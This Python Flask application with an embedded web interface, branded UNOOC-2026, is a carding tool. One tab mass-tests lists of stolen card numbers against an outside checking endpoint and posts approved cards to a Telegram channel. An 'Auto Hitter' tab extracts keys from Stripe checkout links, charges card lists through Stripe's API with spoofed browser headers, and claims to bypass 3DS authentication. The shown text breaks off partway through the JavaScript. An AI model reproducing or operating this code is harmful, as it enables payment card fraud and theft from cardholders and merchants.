from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import re
import os
import asyncio
import aiohttp
import base64
import time
from urllib.parse import unquote

app = Flask(__name__)

AUTOHITTER_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
}

def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip('.,;:')
    return None

def decode_pk_from_url(url):
    result = {"pk": None, "cs": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            try:
                decoded_bytes = base64.b64decode(hash_decoded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
            except:
                pass
    except:
        pass
    return result

def parse_card_autohitter(text):
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

async def get_checkout_info_async(url):
    result = {"pk": None, "cs": None, "merchant": None, "price": None, "currency": None, "init_data": None, "error": None}
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        if result["pk"] and result["cs"]:
            async with aiohttp.ClientSession() as session:
                body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
                async with session.post(f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init", headers=AUTOHITTER_HEADERS, data=body) as r:
                    init_data = await r.json()
                if "error" not in init_data:
                    result["init_data"] = init_data
                    acc = init_data.get("account_settings", {})
                    result["merchant"] = acc.get("display_name") or acc.get("business_name")
                    result["email"] = init_data.get("customer_email") or init_data.get("customer", {}).get("email") or "N/A"
                    lig = init_data.get("line_item_group")
                    inv = init_data.get("invoice")
                    if lig:
                        result["price"] = lig.get("total", 0) / 100
                        result["currency"] = lig.get("currency", "").upper()
                    elif inv:
                        result["price"] = inv.get("total", 0) / 100
                        result["currency"] = inv.get("currency", "").upper()
                else:
                    result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"
    except Exception as e:
        result["error"] = str(e)
    return result

async def charge_card_async(card, checkout_data, proxy=None):
    start = time.perf_counter()
    result = {"card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", "status": None, "response": None, "time": 0}
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    try:
        connector = None
        if proxy:
            connector = aiohttp.TCPConnector()
        async with aiohttp.ClientSession(connector=connector) as s:
            email = init_data.get("customer_email") or "john@example.com"
            checksum = init_data.get("init_checksum", "")
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv:
                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}
                total = subtotal = pi.get("amount", 0)
            cust = init_data.get("customer") or {}
            addr = cust.get("address") or {}
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"
            state = addr.get("state") or "AZ"
            zip_code = addr.get("postal_code") or "85929"
            token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&card[name]={name}&card[address_country]={country}&card[address_line1]={line1}&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip_code}&key={pk}&pasted_fields=number&payment_user_agent=stripe.js%2Fb3f6c00c8a%3B+stripe-js-v3%2Fb3f6c00c8a%3B+checkout&referrer=https%3A%2F%2Fcheckout.stripe.com&time_on_page=32567"
            token_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            async with s.post("https://api.stripe.com/v1/tokens", headers=token_headers, data=token_body) as r:
                tok = await r.json()
            if "error" in tok:
                result["status"] = "DECLINED"
                result["response"] = tok["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            token_id = tok.get("id")
            if not token_id:
                result["status"] = "FAILED"
                result["response"] = "No Token"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            pm_body = f"type=card&card[token]={token_id}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
            pm_headers = {**AUTOHITTER_HEADERS}
            async with s.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_body) as r:
                pm = await r.json()
            if "error" in pm:
                result["status"] = "DECLINED"
                result["response"] = pm["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"
                result["response"] = "No PM"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
            async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=AUTOHITTER_HEADERS, data=conf_body) as r:
                conf = await r.json()
            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                result["status"] = "DECLINED"
                result["response"] = f"{dc.upper()}: {msg}" if dc else msg
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")
                pi_id = pi.get("id", "")
                pi_cs = pi.get("client_secret", "")
                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment Successful"
                elif st == "requires_action" and pi_id and pi_cs:
                    bypass_body = f"payment_method={pm_id}&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi_cs}"
                    bypass_headers = {**AUTOHITTER_HEADERS}
                    async with s.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", headers=bypass_headers, data=bypass_body) as r2:
                        bypass_resp = await r2.json()
                    if "error" not in bypass_resp:
                        bypass_st = bypass_resp.get("status", "")
                        if bypass_st == "succeeded":
                            result["status"] = "CHARGED"
                            result["response"] = "3DS Bypassed - Payment Successful"
                        elif bypass_st == "requires_action":
                            na = bypass_resp.get("next_action") or {}
                            redirect = na.get("redirect_to_url") or {}
                            rurl = redirect.get("url", "")
                            if rurl:
                                async with s.get(rurl, headers=bypass_headers, allow_redirects=True) as r3:
                                    pass
                                async with s.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}", headers=bypass_headers, data=f"key={pk}&client_secret={pi_cs}") as r4:
                                    final = await r4.json()
                                    if final.get("status") == "succeeded":
                                        result["status"] = "CHARGED"
                                        result["response"] = "3DS Bypassed - Payment Successful"
                                    else:
                                        result["status"] = "3DS"
                                        result["response"] = "3DS Required - Manual Auth Needed"
                            else:
                                result["status"] = "3DS"
                                result["response"] = "3DS Required"
                        else:
                            result["status"] = "3DS"
                            result["response"] = f"3DS: {bypass_st}"
                    else:
                        result["status"] = "3DS"
                        result["response"] = "3DS Required"
                elif st == "requires_action":
                    result["status"] = "3DS"
                    result["response"] = "3DS Required"
                elif st == "requires_payment_method":
                    result["status"] = "DECLINED"
                    result["response"] = "Card Declined"
                else:
                    result["status"] = "UNKNOWN"
                    result["response"] = st or "Unknown"
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:50]
    result["time"] = round(time.perf_counter() - start, 2)
    return result

API_BASE = "http://dclub.site/apis/stripe/auth/st7.php?site=fashionspicex.com&cc="
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = "@Linord"

stop_flag = threading.Event()

def get_bin_info(cc):
    try:
        bin_number = cc.split('|')[0][:6]
        resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'bin': bin_number,
                'brand': data.get('brand', 'N/A'),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'country_flag': data.get('country_flag', '')
            }
    except:
        pass
    return None

def clean_response(text):
    text = re.sub(r'<[^>]+>', '', text)
    text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', text)
    text = re.sub(r'[^\w\s\-\|\:\.\,\!\@\#\$\%\&\*\(\)\[\]\{\}\=\+\/\\]', '', text)
    text = re.sub(r'\s+', ' ', text).strip()
    keywords = ['approved', 'live', 'charged', 'success', 'declined', 'dead', 'error', 'invalid', 'cvv', 'match', 'fail', 'reject', 'insufficient', 'expired', 'blocked']
    parts = text.split()
    result = []
    for i, word in enumerate(parts):
        if any(kw in word.lower() for kw in keywords):
            start = max(0, i - 3)
            end = min(len(parts), i + 4)
            result = parts[start:end]
            break
    if result:
        return ' '.join(result)
    return text[:100] if len(text) > 100 else text

def send_telegram(cc, response, bin_info):
    if not TELEGRAM_BOT_TOKEN:
        print("Telegram: No bot token configured")
        return False, "No bot token"
    try:
        bin_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
        bin_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
        bin_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
        bin_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
        bin_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
        bin_flag = bin_info.get('country_flag', '') if bin_info else ''
        
        message = f"""#AutoStripeAuth
━━━━━━━━━━━
[ﾒ] Card ➜ {cc}
[ﾒ] Status ➜ Approved ✅
[ﾒ] Response ➜ {response} 🎉
[ﾒ] Gateway ➜ Stripe Auth V1
━━━━━━━━━━━
[◼] VBV Info ➜ Authenticate Attempt Successful - [ Y ]
━━━━━━━━━━━
[ﾒ] Info ➜ {bin_brand} - {bin_type} - {bin_level}
[ﾒ] Bank ➜ {bin_bank}
[ﾒ] Country ➜ {bin_country} {bin_flag}
━━━━━━━━━━━
[ﾒ] Checked By ➜ UNOOC-2026 [PREMIUM]
[ㇺ] Dev ➜ @Pyftp"""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "disable_web_page_preview": True
        }
        resp = requests.post(url, json=payload, timeout=15)
        result = resp.json()
        print(f"Telegram API response: {result}")
        if result.get('ok'):
            return True, "Sent"
        else:
            error_desc = result.get('description', 'Unknown error')
            print(f"Telegram error: {error_desc}")
            return False, error_desc
    except Exception as e:
        print(f"Telegram exception: {str(e)}")
        return False, str(e)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNOOC-2026</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(145deg, #0a0a0f 0%, #12121a 50%, #0a0a0f 100%);
            min-height: 100vh;
            padding: 20px;
            color: #d0d0d8;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 0%, rgba(90, 100, 130, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 100%, rgba(70, 80, 110, 0.06) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #a0b0c8;
            text-align: center;
            margin-bottom: 30px;
            font-weight: 700;
            font-size: 36px;
            letter-spacing: 3px;
        }
        .glass {
            background: rgba(25, 28, 38, 0.8);
            border: 1px solid rgba(100, 120, 150, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .input-section {
            background: rgba(25, 28, 38, 0.85);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(100, 120, 150, 0.25);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .input-section:hover {
            border-color: rgba(100, 120, 150, 0.4);
        }
        label {
            display: block;
            color: #8090a8;
            margin-bottom: 10px;
            font-weight: 500;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        textarea {
            width: 100%;
            padding: 16px;
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px;
            color: #d0d0d8;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            min-height: 120px;
            transition: border-color 0.2s ease;
        }
        textarea:focus {
            outline: none;
            border-color: rgba(100, 130, 170, 0.5);
        }
        textarea::placeholder { color: #505868; }
        .btn-row {
            display: flex;
            gap: 15px;
            margin-top: 25px;
            flex-wrap: wrap;
        }
        button {
            padding: 14px 28px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.15s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Poppins', sans-serif;
        }
        button:active {
            transform: scale(0.98);
        }
        .btn-primary {
            background: #4a5568;
            color: #fff;
            flex: 1;
            min-width: 150px;
            border: 1px solid rgba(100, 120, 150, 0.3);
        }
        .btn-primary:hover {
            background: #5a6578;
        }
        .btn-danger {
            background: #553030;
            color: #fff;
            border: 1px solid rgba(180, 80, 80, 0.3);
        }
        .btn-danger:hover {
            background: #653838;
        }
        .btn-secondary {
            background: rgba(30, 35, 45, 0.8);
            color: #8090a8;
            border: 1px solid rgba(80, 100, 130, 0.4);
        }
        .btn-secondary:hover {
            border-color: rgba(100, 130, 170, 0.5);
            color: #a0b0c8;
        }
        .results-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-top: 25px;
        }
        @media (max-width: 768px) {
            .results-grid { grid-template-columns: 1fr; }
        }
        .result-box {
            background: rgba(25, 28, 38, 0.85);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid rgba(100, 120, 150, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .result-box:hover {
            border-color: rgba(100, 120, 150, 0.35);
        }
        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(80, 100, 130, 0.3);
        }
        .result-title {
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .result-title.approved { color: #81c784; }
        .result-title.declined { color: #e57373; }
        .count-badge {
            background: rgba(0,0,0,0.3);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            border: 1px solid rgba(100, 120, 150, 0.2);
        }
        .cards-container {
            max-height: 400px;
            overflow-y: auto;
            padding-right: 5px;
        }
        .cards-container::-webkit-scrollbar { width: 6px; }
        .cards-container::-webkit-scrollbar-track { background: #15181f; border-radius: 3px; }
        .cards-container::-webkit-scrollbar-thumb { background: #3a4050; border-radius: 3px; }
        .card {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.25);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 10px;
            font-size: 12px;
            position: relative;
        }
        .card.approved { border-left: 3px solid #81c784; }
        .card.declined { border-left: 3px solid #e57373; }
        .card-cc {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            margin-bottom: 6px;
            color: #a0b0c8;
        }
        .card-response {
            color: #8090a8;
            line-height: 1.5;
            word-break: break-word;
        }
        .full-response {
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(100, 120, 150, 0.25);
            border-radius: 12px;
            padding: 14px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 12px;
        }
        .response-line {
            color: #9098a8;
            padding: 3px 0;
            word-break: break-word;
        }
        .response-line.success {
            color: #4ade80;
            font-weight: bold;
        }
        .response-label {
            color: #8b6914;
            font-weight: bold;
        }
        .response-divider {
            color: #3d2015;
            padding: 5px 0;
            text-align: center;
        }
        .card-copy {
            position: absolute;
            top: 8px;
            right: 8px;
            background: none;
            border: none;
            color: #6b5245;
            cursor: pointer;
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 4px;
            transition: all 0.2s;
        }
        .card-copy:hover { color: #a0b0c8; background: rgba(100,130,170,0.1); }
        .progress-bar {
            background: #15181f;
            border-radius: 10px;
            height: 8px;
            margin: 15px 0;
            overflow: hidden;
            display: none;
        }
        .progress-bar.show { display: block; }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4a5568, #6a7588);
            border-radius: 10px;
            transition: width 0.3s;
            width: 0%;
        }
        .status-text {
            text-align: center;
            color: #8090a8;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        .status-text.show { display: block; }
        .empty-state {
            text-align: center;
            color: #6b5245;
            padding: 40px 20px;
            font-size: 13px;
        }
        .telegram-status {
            font-size: 11px;
            color: #6b5245;
            margin-top: 5px;
        }
        .telegram-status.sent { color: #81c784; }
        .telegram-status.error { color: #e57373; }
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .tab-btn {
            flex: 1;
            padding: 16px 20px;
            background: rgba(30, 35, 45, 0.8);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px;
            color: #8090a8;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, border-color 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        .tab-btn:hover {
            border-color: rgba(100, 130, 170, 0.5);
            color: #a0b0c8;
        }
        .tab-btn.active {
            background: #4a5568;
            border-color: rgba(100, 130, 170, 0.5);
            color: #fff;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .checkout-info {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            font-size: 13px;
        }
        .checkout-info .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid rgba(80, 100, 130, 0.2);
        }
        .checkout-info .info-row:last-child { border-bottom: none; }
        .checkout-info .info-label { color: #6a7588; }
        .checkout-info .info-value { color: #a0b0c8; font-weight: 600; }
        .bin-info {
            margin: 8px 0;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            align-items: center;
        }
        .bin-badge {
            background: #3a4050;
            color: #a0b0c8;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
        }
        .bin-bank {
            width: 100%;
            color: #7080a0;
            font-size: 11px;
            margin-top: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>UNOOC-2026</h1>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('stripeauth')">Stripe Auth</button>
            <button class="tab-btn" onclick="switchTab('autohitter')">Auto Hitter</button>
        </div>
        
        <div id="stripeauth-tab" class="tab-content active">
            <div class="input-section">
                <label>Mass Check - Enter CC List (one per line)</label>
                <textarea id="ccInput" placeholder="4111111111111111|12|2025|123&#10;5500000000000004|06|2026|321&#10;378282246310005|09|2027|1234"></textarea>
                
                <div class="btn-row">
                    <button class="btn-primary" id="startBtn" onclick="startCheck()">Start Check</button>
                    <button class="btn-danger" id="stopBtn" onclick="stopCheck()" style="display:none;">Stop</button>
                    <button class="btn-secondary" onclick="clearLogs()">Clear Logs</button>
                </div>
                
                <div class="progress-bar" id="progressBar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="status-text" id="statusText">Processing...</div>
            </div>
        
        <div class="results-grid">
            <div class="result-box">
                <div class="result-header">
                    <span class="result-title approved">Approved</span>
                    <span class="count-badge" id="approvedCount">0</span>
                </div>
                <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAll('approved')">Copy All Approved</button>
                <div class="cards-container" id="approvedCards">
                    <div class="empty-state">No approved cards yet</div>
                </div>
            </div>
            
            <div class="result-box">
                <div class="result-header">
                    <span class="result-title declined">Declined</span>
                    <span class="count-badge" id="declinedCount">0</span>
                </div>
                <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAll('declined')">Copy All Declined</button>
                <div class="cards-container" id="declinedCards">
                    <div class="empty-state">No declined cards yet</div>
                </div>
            </div>
        </div>
        </div>
        
        <div id="autohitter-tab" class="tab-content">
            <div class="input-section">
                <label>Stripe Checkout URL</label>
                <textarea id="checkoutUrl" placeholder="https://checkout.stripe.com/c/pay/cs_live_..." style="min-height:60px;"></textarea>
                
                <label style="margin-top:15px;">Proxies (optional - one per line, format: ip:port or ip:port:user:pass)</label>
                <textarea id="proxyInput" placeholder="192.168.1.1:8080&#10;192.168.1.2:8080:username:password" style="min-height:60px;"></textarea>
                
                <div class="btn-row" style="margin-top:15px;">
                    <button class="btn-primary" onclick="initCheckout()">Load Checkout</button>
                </div>
                
                <div class="checkout-info" id="checkoutInfo" style="display:none;">
                    <div class="info-row"><span class="info-label">Merchant</span><span class="info-value" id="infoMerchant">-</span></div>
                    <div class="info-row"><span class="info-label">Email</span><span class="info-value" id="infoEmail">-</span></div>
                    <div class="info-row"><span class="info-label">Price</span><span class="info-value" id="infoPrice">-</span></div>
                    <div class="info-row"><span class="info-label">PK</span><span class="info-value" id="infoPk">-</span></div>
                    <div class="info-row"><span class="info-label">CS</span><span class="info-value" id="infoCs">-</span></div>
                </div>
            </div>
            
            <div class="input-section" id="ahCardsSection" style="display:none;">
                <label>CC List (one per line)</label>
                <textarea id="ahCcInput" placeholder="4111111111111111|12|2025|123"></textarea>
                
                <div class="btn-row">
                    <button class="btn-primary" id="ahStartBtn" onclick="startAutoHit()">Start Auto Hit</button>
                    <button class="btn-danger" id="ahStopBtn" onclick="stopAutoHit()" style="display:none;">Stop</button>
                    <button class="btn-secondary" onclick="clearAhLogs()">Clear Logs</button>
                </div>
                
                <div class="progress-bar" id="ahProgressBar">
                    <div class="progress-fill" id="ahProgressFill"></div>
                </div>
                <div class="status-text" id="ahStatusText">Processing...</div>
            </div>
            
            <div class="results-grid" id="ahResultsGrid" style="display:none;">
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title approved">Charged</span>
                        <span class="count-badge" id="ahChargedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('charged')">Copy All Charged</button>
                    <div class="cards-container" id="ahChargedCards">
                        <div class="empty-state">No charged cards yet</div>
                    </div>
                </div>
                
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title declined">Declined/3DS</span>
                        <span class="count-badge" id="ahDeclinedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('declined')">Copy All Declined</button>
                    <div class="cards-container" id="ahDeclinedCards">
                        <div class="empty-state">No declined cards yet</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let isRunning = false;
        let approvedList = [];
        let declinedList = [];
        
        async function startCheck() {
            const input = document.getElementById('ccInput').value.trim();
            if (!input) return alert('Please enter CC list');
            
            const ccList = input.split('\\n').map(cc => cc.trim()).filter(cc => cc);
            if (ccList.length === 0) return;
            
            isRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            document.getElementById('progressBar').classList.add('show');
            document.getElementById('statusText').classList.add('show');
            
            for (let i = 0; i < ccList.length; i++) {
                if (!isRunning) break;
                
                const cc = ccList[i];
                const progress = ((i + 1) / ccList.length) * 100;
                document.getElementById('progressFill').style.width = progress + '%';
                document.getElementById('statusText').textContent = `Processing ${i + 1} of ${ccList.length}...`;
                
                try {
                    const response = await fetch('/check', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cc: cc})
                    });
                    const data = await response.json();
                    addCard(cc, data.response, data.status, data.telegram_sent, data.telegram_error, data.bin_info);
                } catch (e) {
                    addCard(cc, 'Error: Request failed', 'declined', false, '', null);
                }
            }
            
            finishCheck();
        }
        
        function stopCheck() {
            isRunning = false;
            fetch('/stop', {method: 'POST'});
            finishCheck();
        }
        
        function finishCheck() {
            isRunning = false;
            document.getElementById('startBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            document.getElementById('statusText').textContent = 'Completed!';
            setTimeout(() => {
                document.getElementById('progressBar').classList.remove('show');
                document.getElementById('statusText').classList.remove('show');
            }, 2000);
        }
        
        function addCard(cc, response, status, telegramSent, telegramError, binInfo) {
            const container = document.getElementById(status === 'approved' ? 'approvedCards' : 'declinedCards');
            const countEl = document.getElementById(status === 'approved' ? 'approvedCount' : 'declinedCount');
            const list = status === 'approved' ? approvedList : declinedList;
            
            if (container.querySelector('.empty-state')) {
                container.innerHTML = '';
            }
            
            list.push({cc, response});
            countEl.textContent = list.length;
            
            let telegramMsg = '';
            if (status === 'approved') {
                if (telegramSent) {
                    telegramMsg = '<div class="telegram-status sent">✓ Sent to Telegram</div>';
                } else if (telegramError) {
                    telegramMsg = '<div class="telegram-status error">✗ ' + escapeHtml(telegramError) + '</div>';
                } else {
                    telegramMsg = '<div class="telegram-status">Telegram not configured</div>';
                }
            }
            
            let binHtml = '';
            if (binInfo) {
                binHtml = `
                    <div class="bin-info">
                        <span class="bin-badge">${binInfo.brand}</span>
                        <span class="bin-badge">${binInfo.type}</span>
                        <span class="bin-badge">${binInfo.level}</span>
                        <span class="bin-badge">${binInfo.country} ${binInfo.country_flag}</span>
                        <div class="bin-bank">${binInfo.bank}</div>
                    </div>
                `;
            }
            
            const card = document.createElement('div');
            card.className = 'card ' + status;
            card.innerHTML = `
                <button class="card-copy" onclick="copyCard(this)">Copy</button>
                <div class="card-cc">${escapeHtml(cc)}</div>
                ${binHtml}
                <div class="card-response">${escapeHtml(response)}</div>
                ${telegramMsg}
            `;
            container.insertBefore(card, container.firstChild);
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function copyCard(btn) {
            const card = btn.parentElement;
            const cc = card.querySelector('.card-cc').textContent;
            const fullResp = card.querySelector('.full-response');
            const cardResp = card.querySelector('.card-response');
            let copyText = cc;
            if (fullResp) {
                copyText = fullResp.innerText;
            } else if (cardResp) {
                copyText = cc + '\\n' + cardResp.textContent;
            }
            navigator.clipboard.writeText(copyText);
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 1500);
        }
        
        function copyAll(type) {
            const list = type === 'approved' ? approvedList : declinedList;
            if (list.length === 0) return alert('No cards to copy');
            const text = list.map(item => item.cc + ' | ' + item.response).join('\\n');
            navigator.clipboard.writeText(text);
            alert('Copied ' + list.length + ' cards!');
        }
        
        function clearLogs() {
            approvedList = [];
            declinedList = [];
            document.getElementById('approvedCards').innerHTML = '<div class="empty-state">No approved cards yet</div>';
            document.getElementById('declinedCards').innerHTML = '<div class="empty-state">No declined cards yet</div>';
            document.getElementById('approvedCount').textContent = '0';
            document.getElementById('declinedCount').textContent = '0';
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
